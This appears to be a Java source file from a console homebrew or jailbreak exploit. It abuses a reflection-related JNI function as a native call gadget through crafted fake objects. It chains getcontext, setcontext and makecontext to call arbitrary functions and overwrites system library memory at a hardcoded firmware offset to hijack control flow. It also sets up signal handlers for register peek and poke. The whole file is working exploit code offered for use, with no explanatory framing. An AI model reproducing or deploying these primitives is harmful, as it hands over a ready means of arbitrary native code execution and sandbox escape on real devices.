package org.homebrew;

public class NativeStuff
{
    public static native long multiNewArrayGadget(long payload, int[] array);
    private static boolean gadget_initialized = false;
    private static long mov_rax_rdi_0x10_ret = 0;
    private static long getcontext = 0;
    private static long setcontext = 0;
    private static long makecontext = 0;
    private static long open = 0;
    private static long getdents = 0;
    private static long close = 0;
    private static long sceKernelGetFsSandboxRandomWord = 0;
    private static java.lang.reflect.Field fd_fd = null;
    private static void init() throws Exception
    {
        if(!gadget_initialized)
        {
            NativeUtils.addSymbol("Java_org_homebrew_NativeStuff_multiNewArrayGadget",
                NativeUtils.dlsym(74, "Java_java_lang_reflect_Array_multiNewArray"));
            gadget_initialized = true;
        }
        if(mov_rax_rdi_0x10_ret == 0)
            mov_rax_rdi_0x10_ret = NativeUtils.dlsym(0x2001, "sceKernelGetEventData");
        if(getcontext == 0)
            getcontext = NativeUtils.dlsym(0x2001, "getcontext");
        if(setcontext == 0)
            setcontext = NativeUtils.dlsym(0x2001, "setcontext");
        if(makecontext == 0)
            makecontext = NativeUtils.dlsym(2, "makecontext");
        if(open == 0)
            open = NativeUtils.dlsym(0x2001, "open");
        if(getdents == 0)
            getdents = NativeUtils.dlsym(0x2001, "getdents");
        if(close == 0)
            close = NativeUtils.dlsym(0x2001, "close");
        if(sceKernelGetFsSandboxRandomWord == 0)
            sceKernelGetFsSandboxRandomWord = NativeUtils.dlsym(0x2001, "sceKernelGetFsSandboxRandomWord");
        if(fd_fd == null)
        {
            fd_fd = java.io.FileDescriptor.class.getDeclaredField("fd");
            fd_fd.setAccessible(true);
        }
    }
    private static long callGadget(long func1, long func2, long[] args) throws Exception
    {
        //TODO: allocate less memory
        long obj1 = NativeUtils.allocateMemory(8);
        long obj2 = NativeUtils.allocateMemory(0xa0);
        long obj3 = NativeUtils.allocateMemory(256);
        long obj4 = NativeUtils.allocateMemory(0xe0);
        long obj5 = NativeUtils.allocateMemory(0x4c0);
        long obj6 = NativeUtils.allocateMemory(0x160);
        NativeUtils.putLong(obj1, obj2);
        NativeUtils.putLong(obj2+0x98, obj3);
        NativeUtils.putInt(obj3+0xc4, 0);
        NativeUtils.putLong(obj3, obj4);
        NativeUtils.putLong(obj3+0x10, obj5);
        NativeUtils.putLong(obj4+0xd8, mov_rax_rdi_0x10_ret); //obj3 -> obj5
        NativeUtils.putLong(obj5, obj6);
        NativeUtils.putLong(obj6+0x158, func1);
        int[] q = new int[]{1};
        multiNewArrayGadget(obj1, q);
        for(int i = 1; i < 7; i++)
            NativeUtils.putLong(obj5+0x40+8*i, args[i]);
        NativeUtils.putLong(obj5+0xe0, args[0]);
        NativeUtils.putLong(obj5, obj6); //overwrites sigmask
        NativeUtils.putLong(obj6+0x158, func2);
        long ans = multiNewArrayGadget(obj1, q);
        if(ans != 0)
            ans = NativeUtils.fastGetLong(ans);
        NativeUtils.freeMemory(obj1);
        NativeUtils.freeMemory(obj2);
        NativeUtils.freeMemory(obj3);
        NativeUtils.freeMemory(obj4);
        NativeUtils.freeMemory(obj5);
        NativeUtils.freeMemory(obj6);
        return ans;
    }
    public static long callFunction(long func, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) throws Exception
    {
        init();
        long[] arr = new long[]{func, arg1, arg2, arg3, arg4, arg5, arg6};
        return callGadget(getcontext, setcontext, arr);
    }
    public static String[] listdir(String path) throws Exception
    {
        init();
        long pmem = NativeUtils.allocateMemory(path.length() + 1);
        for(int i = 0; i < path.length(); i++)
        {
            NativeUtils.putByte(pmem + i, (byte)path.charAt(i));
        }
        NativeUtils.putByte(pmem + path.length(), (byte)0);
        int fd = (int)callFunction(open, pmem, 0, 0, 0, 0, 0);
        long buf = NativeUtils.allocateMemory(16384);
        long ll = -1;
        java.util.ArrayList ans = new java.util.ArrayList();
        while((ll = callFunction(getdents, fd, buf, 16384, 0, 0, 0)) > 0)
        {
            long i = 0;
            while(i < ll)
            {
                long l = (NativeUtils.getByte(buf + i + 5) + 256) % 256 * 256 + (NativeUtils.getByte(buf + i + 4) + 256) % 256;
                long l2 = (NativeUtils.getByte(buf + i + 7) + 256) % 256;
                String name = "";
                for(long k = 0; k < l2; k++)
                    name += (char)((NativeUtils.getByte(buf + i + 8 + k) + 256) % 256);
                i += l;
                ans.add(name);
            }
        }
        callFunction(close, fd, 0, 0, 0, 0, 0);
        NativeUtils.freeMemory(pmem);
        NativeUtils.freeMemory(buf);
        String[] arr = new String[ans.size()];
        for(int i = 0; i < ans.size(); i++)
            arr[i] = (String)ans.get(i);
        return arr;
    }
    public static long chainContext(long next, long func, long arg1, long arg2, long arg3) throws Exception
    {
        init();
        long stack = NativeUtils.allocateMemory(4096);
        long ctxt = NativeUtils.allocateMemory(0x4000);
        for(int i = 0; i < 0x4000; i += 8)
            NativeUtils.putLong(ctxt+i, 0);
        callFunction(getcontext, ctxt, 0, 0, 0, 0, 0);
        NativeUtils.putLong(ctxt+0x4c0, next);
        NativeUtils.putLong(ctxt+0x4c8, stack);
        NativeUtils.putLong(ctxt+0x4d0, 4096);
        callFunction(makecontext, ctxt, func, 3, arg1, arg2, arg3);
        return ctxt;
    }
    public static String getFsSandboxRandomWord() throws Exception
    {
        long ptr = callFunction(sceKernelGetFsSandboxRandomWord, 0, 0, 0, 0, 0, 0);
        String ans = "";
        for(int i = 0; NativeUtils.getByte(ptr+i) != 0; i++)
            ans += (char)NativeUtils.getByte(ptr+i);
        return ans;
    }
    public static long packContext(long ctxt) throws Exception
    {
        /* 4.03 offset hardcoded */
        long handle = NativeUtils.dlopen("/" + getFsSandboxRandomWord() + "/common/lib/libScePlayerInvitationDialog.sprx");
        long fn1 = NativeUtils.dlsym(handle, "scePlayerInvitationDialogInitialize");
        long fn2 = NativeUtils.dlsym(handle, "scePlayerInvitationDialogTerminate");
        long vt = NativeUtils.allocateMemory(16);
        NativeUtils.putLong(fn1+0xbe00, ctxt);
        NativeUtils.putLong(ctxt, vt);
        NativeUtils.putLong(ctxt+8, -1);
        NativeUtils.putLong(vt+8, setcontext);
        return fn2+18;
    }
    public static java.io.FileDescriptor getFD(int fd) throws Exception
    {
        init();
        java.io.FileDescriptor ans = new java.io.FileDescriptor();
        fd_fd.set(ans, new java.lang.Integer(fd));
        return ans;
    }
    public static class SignalThread
    {
        public long sigframe;
        public int comm_fd;
        public java.io.FileInputStream comm_in;
        public java.io.FileOutputStream comm_out;
        public SignalThread() throws Exception
        {
            long pipebuf = NativeUtils.allocateMemory(8);
            callFunction(NativeUtils.dlsym(0x2001, "socketpair"), 1, 1, 0, pipebuf, 0, 0);
            int sig_fd = NativeUtils.getInt(pipebuf);
            comm_fd = NativeUtils.getInt(pipebuf+4);
            comm_in = new java.io.FileInputStream(getFD(comm_fd));
            comm_out = new java.io.FileOutputStream(getFD(comm_fd));
            final long stack = callFunction(NativeUtils.dlsym(0x2001, "mmap"), 0, 16384, 3, 4098, -1, 0);
            sigframe = stack + 0x38b0;
            /* order is reversed */
            long ctx = 0;
            ctx = chainContext(ctx, NativeUtils.dlsym(0x2001, "sigreturn"), sigframe, 0, 0);
            ctx = chainContext(ctx, NativeUtils.dlsym(0x2001, "_read"), sig_fd, pipebuf, 1);
            ctx = chainContext(ctx, NativeUtils.dlsym(0x2001, "_write"), sig_fd, pipebuf, 1);
            //ctx = chainContext(ctx, NativeUtils.dlsym(0x2001, "sceKernelSleep"), 5, 0, 0);
            long cbk = packContext(ctx);
            NativeUtils.putLong(stack, cbk); //NativeUtils.dlsym(0x2001, "sceKernelSleep"));
            NativeUtils.putLong(stack+8, 3);
            NativeUtils.putLong(stack+16, 0);
            NativeUtils.putLong(stack+24, 0);
            NativeUtils.putLong(stack+48, stack);
            NativeUtils.putLong(stack+56, 16384);
            NativeUtils.putLong(stack+64, 0);
            /* order is reversed */
            long ctx2 = 0;
            ctx2 = chainContext(ctx2, NativeUtils.dlsym(0x2001, "pthread_kill"), 0, 5, 0);
            long kill_args = NativeUtils.getLong(ctx2+0x58);
            ctx2 = chainContext(ctx2, NativeUtils.dlsym(0x2001, "sigaltstack"), stack+48, 0, 0);
            callFunction(NativeUtils.dlsym(0x2001, "sigaction"), 4, stack, 0, 0, 0, 0);
            callFunction(NativeUtils.dlsym(0x2001, "sigaction"), 5, stack, 0, 0, 0, 0);
            callFunction(NativeUtils.dlsym(0x2001, "sigaction"), 10, stack, 0, 0, 0, 0);
            callFunction(NativeUtils.dlsym(0x2001, "sigaction"), 11, stack, 0, 0, 0, 0);
            callFunction(NativeUtils.dlsym(0x2001, "sigaction"), 12, stack, 0, 0, 0, 0);
            callFunction(NativeUtils.dlsym(0x2001, "pthread_create"), kill_args, 0, setcontext, ctx2, 0, 0);
        }
        public void awaitSignal() throws Exception
        {
            comm_in.read();
        }
        public long peek(int offset) throws Exception
        {
            return NativeUtils.fastGetLong(sigframe+offset);
        }
        public void poke(int offset, long value) throws Exception
        {
            NativeUtils.putLong(sigframe+offset, value);
        }
        public void cont() throws Exception
        {
            comm_out.write(0);
            comm_in.read();
        }
        /* from freebsd machine/ucontext.h */
        public static final int RDI = 0x48;
        public static final int RSI = 0x50;
        public static final int RDX = 0x58;
        public static final int RCX = 0x60;
        public static final int R8 = 0x68;
        public static final int R9 = 0x70;
        public static final int RAX = 0x78;
        public static final int RBX = 0x80;
        public static final int RBP = 0x88;
        public static final int R10 = 0x90;
        public static final int R11 = 0x98;
        public static final int R12 = 0xa0;
        public static final int R13 = 0xa8;
        public static final int R14 = 0xb0;
        public static final int R15 = 0xb8;
        public static final int TRAPNO = 0xc0; //32-bit
        public static final int CR2 = 0xc8;
        public static final int ERRCODE = 0xd8;
        public static final int RIP = 0xe0;
        public static final int EFLAGS = 0xf0;
        public static final int RSP = 0xf8;
    }
}
